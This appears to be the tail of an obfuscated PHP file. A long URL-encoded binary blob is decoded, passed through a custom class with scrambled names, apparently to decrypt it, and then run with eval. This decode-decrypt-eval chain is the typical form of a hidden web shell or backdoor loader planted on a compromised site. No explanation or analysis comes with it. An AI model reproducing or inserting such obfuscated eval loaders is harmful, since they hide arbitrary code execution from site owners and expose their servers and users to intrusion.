O2%B4k%894D%E7%FA%7C7%AA%02k%1D%01%19.%CBy%0C%8C%BF%89%EB%D5m%ED%0D%F1ve%F2O9%E3x%B9%2B%1Fa%8C%20k%C7%F0%AB%FE%DC%5D%90%9E%84%F86E%5B%AA%D8%BF%B9%60%3D%A1%27%28E%91%BDP6%AFZ%188%7C4%BFj%94%E6y%0D%BD%F9%26%82%04%BA%9B%5D%00%1C%B5%99%8C%19%ABDa0%BE0%1E%3E%E2%28%91l%C07_%F1%AB%097%F6%C1%2F%A6hG%7D%E63%5B%22M%14u1%28%97%9D%5B2%C6%05%E6%B7%83%CEG%B0..%097%F6%C1%2F%A6hG%D6_%A0%BEh%944f%00y%98%A3%DE%C0%B0%9A%A6QK%D6%BA%F8%A8%89%F2%18%AA%22c%E5%BD%F9%99%28%86X%DC%FE%3A%2CD%E6%F9y%E5%CA2%2F%EC%CD%2A2%CDCQ%0F%7F%22%D0%B1%3CW~l%13%1E%D6%D5H%DA%E1A-%D3F%C8q%94J8%5E%86t%B6%3B%0E%CD%C0%2C%1CO%FB%FC%89z%C2%8A%EA%BF%C4%FE%FF-%9C%2B%CD%5C%18%DA6%1B%80%EC%E5%FF%EE%07m%DA%DC%DB%1C%AC%EA%A0%EF%B7%F4T%A4%04%7F%2CK%B7q%FE%F5%24%A3%27%FB%1A%D5HyZ%BC%EF%FE%14%D9a%B6%FDYg%2C%A8%BBZ%A9%DA%83%A8a%9D%EC%DEM%19%A3O%83%09%AFD%06%90%98%E4%20%CA%2F%AF%E0%F2W4y%3EK%8D%AD%8E%97g%3C%A3ze%A1%D0a%3A%B2%23%C2%069%13%12%CA%81%20%5B%E6%C3bz%0Em1%85%B23%02%7C%94%BE%2CVJ%1As%BC%FC%B9Yk%24%13aC%14%1A%10%C1%95%0F%BC%C5p%AC4T%7F%083%D0%B7k%DE%E9%E5%2AK%D0%22%E605%7D%40%99%98%21o%D2%20%D2W%7BO%BE%60%D4%ED%E9%BF%B5-Mi%22%86v%01%98~%D2%14%A6%2B%EB-%B7%BC%02%BF%F1%15%1D%90%E8%F76%9C%25%A1%CD%E3%08%E1o%89%29%2F%C9%8B%8CK%8F%91%04%3DI%D7%3B%01%82H%F7%8C%D7L%3A%F9%28%23%DC%A0%EE%FF%B9%28%0A%F4B%A6%EE1I%FB%C3%87%5B%A4%83%12%14%12%EA%0A_Dl%D6%3B%94%D1%B5%1E%E5%5E%C9%94%93%FE%B6%3D%12%FAKF%9E%FA%60%DD%84ai%7D%0B%85%FF%5D%9D%19%EA%9Dv%21%2C~%E5%E8%0A%B4%CD%AE%D3%B5%BDG%40i%A2L%CD%BC%87pU%16%AD%E9%E8%7F%AE%B4%06%B5%A0%B4o%60%E9%D1%2C%A9%ED%1Dg%AA%3Az%019%A4%D8%A9D%B2%3A%D3%97%85%25%0A4%A7%1B%E1%AEg%B2%BAs%AD%C8%2AG%21%8FN%A0%8B%18%E9t%B1%EB%7B%F1%E4%2C%E0%20V-%E6BU%C1%14%E1%8B%07t%02%EEf%1C%1Ev%F03RFP%E0%18%F9%F9%B1%D6%17A%F6%3E%9F%B3f%C0%01%7C%A6%96O%D1QE%27%FBI%D8%26%27%16%E2%FF%FCD%AA%D5%EA%CF%BA%22%05%E3%E5%04-%AC%D5%CB%9F3diTS%99%2FC%5Cd%05Y%18o%AE%86%12%2Fs%BB%EE%07%D2%CD%01%24%F3%AA%B4%B0%27%D9%A4%0C%070%F7%BB%40a%20%11E%15%8AD%D3hf%AB%F5F%92Cs%07%C2py9%F8q%C9%22%01%E5%8FS%E4%CD%88e%AC%A1%11%C4%A3G-%84%FD%DF%25%8E1%3F%D1%85%40%EE%3F%CA%B5x%94%C6%F5%02%FDpTCq%A94%A4l%8A%BF%95%F2%C1%96%3A%20%E5.%B0%F3%C6Y%5C%0F%88l%D2%AD%AF%87S%04%F2%3A%94N%1D%90%E8%F76%9C%25%A1%B8%8F%B4I%22%10%A5%29%AAA%CF%FF%9B%C1k%BB%0D%FBGH%98%13%EFu%AD%7C%DD%EC%FDw%D2%9Ej%FE%24%BD%3B%1Cn%0A%DB%C1%1A%BA%23%07a%A4%CBd%F3%B7xP%ED%D7%C6W%D85q%94%BC%EB%26%09%CBR%80p%F5%88%B0%A1%FAU-%DF%FEZ%CF%FD%5B%24v%C2IT8%7C4%BFj%94%E6y%27.v%DA%A2%8E%CA%93%D5%CE%FB%E6%B9%E8z%80%C7%83%0C%06%07%C8%FF%E5%BEw%E2%C2%FE%8F%11%5D%FFI%C8%033%F71%29%DC%E3%14%2A%D7%C0%FA%3C%DFt%99%CE%EA%DE%C0%AF%DFR%E9S%B5%91%5Bt%7B%E2%F9%A6o%3C%40E%29%BA%8F%7D%5BOm%A2l%0E%5D%29%E4%93%CE%5C%18%EC%17%9Em%93%AE%F3E%91%8E%08%FAB%D4%ED%EDk%C6%AB%EF%A5%B4%9F%C7%AD%DC%AEs%C9%B0%B89%B0%EA%9BuFSNd%C8%EE%87l%D2Z%15%0B%F7%15%91%D9%89%F3%A9%8B%F7O%8D%3B%85V%D8R%04t%0F%A6%A7U%C8%ED_%5D%24%15%EF%8B%A9%AC%0E3DTZ%0F%DA%FB%7F%A3%1C%1B%8F%8C%2C%B0%AFw%2BZ%20m%D1%23%236%C3%E8%C4%B6955C%06sG%0FO%A6%DBN%92%D7%C8%40%16%9C%86%96%93SP%3BBnP%EF%3E6%1D%EE%3A%B5%1F%EDB%A4Ip%E3%D3%CF%7C%3CO%9D%7F%A1%86%9D6%3A%2B%DF%02%C2%FC%23L%88S%02%3A%B5%BBb%A8%A2MP%B5%A1S~%FB%23I%40%AD%25%15%1F%B1%FEX%09%F1%C1%2A%EF%D4%E37z%BAa%AD%1DA%B40%D3b9%941%1A%8D%D3%E0A%D9IP%88%A4%E2%B2%B9%26E%86%A5%C3%020%07%A6S~%FB%23I%40%AD%25%0C%B5%D94%CC%975%A2%F3%99_J%B43%3E%ED%FC%DE%9B%118CP%D0%25%12%AC%3E%3BkHDQ%B4X%98%3E%BC%ABv%40%02%7D%97%A7%9B%27%11%FCb%23%7F%AAC%82_f%93%A2%04y%11w%AA%1A%CA%E7%83%E0%0C%8D%96W%3B%2B%11%F1%1DJECSrV%E7k%DC%D9XHE%92%9C%CB%D3%EA%27%0E%FBz%F5x%F8%19%FEqZ%966%CC%1B%AB%EBJN%3C%11%FFW%8B%18%FCH%A7%D1H%A1%1A%EA%B7%C8T%FA%0B%E5%5B%EA%7C%AF%EC_%26C%86%A3Qfo%7D%B2%C6%DE%C7%9D%F0.%0E%7B%9E%C3%21%B7n%EF%E6%85%1F%F7%FE5%92%FA%B4%23%3D%00%9F%13%FF%97%F8e%8F4%D0%AD%E4%B3%A6%A1j%99~q%A1L%07%3CQN8%7C4%BFj%94%E6y2%07%F0K%96%F4%0E%09%07%7BN%B6%11s%5B%EDOb%C3%AB%08Bk%D43%A3%8F%FF%F1%BF%29V%AB%7C%A5%B0Q%0CoC%BE%D3%91%8F%91%E7%21%40";
$rfgsh = rawurldecode($kkln); 
$okl_prffg = new okl_prffg(64); 
eval($okl_prffg->lurhs($rfgsh));
